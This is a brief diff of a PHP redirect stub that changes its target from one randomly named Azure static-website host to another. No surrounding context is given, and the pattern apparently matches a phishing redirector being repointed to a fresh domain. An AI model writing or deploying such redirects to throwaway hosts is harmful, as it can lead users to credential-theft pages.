@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://mazxxingggg.z13.web.core.windows.net/");
+header("Location: https://maxmusiufop.z8.web.core.windows.net/");
  
 exit;
 ?>
